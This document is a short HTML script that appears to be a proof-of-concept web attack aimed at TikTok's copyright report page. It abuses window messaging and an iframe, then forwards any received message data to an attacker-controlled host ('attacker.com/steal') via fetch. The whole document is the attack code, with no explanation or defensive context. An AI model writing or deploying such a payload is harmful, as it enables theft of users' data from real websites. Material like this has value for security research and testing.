<script>
parent.postMessage({
    action: "requestRedirectionTo",
    targetUrlStr: "https://www.tiktok.com/legal/report/Copyright"
}, "*");

setTimeout(() => {
    const frame = document.createElement('iframe');
    frame.src = "https://www.tiktok.com/legal/report/Copyright";
    document.body.appendChild(frame);

    frame.onload = () => {
        frame.contentWindow.postMessage("steal","*");
    };

    window.addEventListener("message", (e) => {
        fetch('https://attacker.com/steal?data=' + encodeURIComponent(e.data));
    });
}, 2000);
</script>
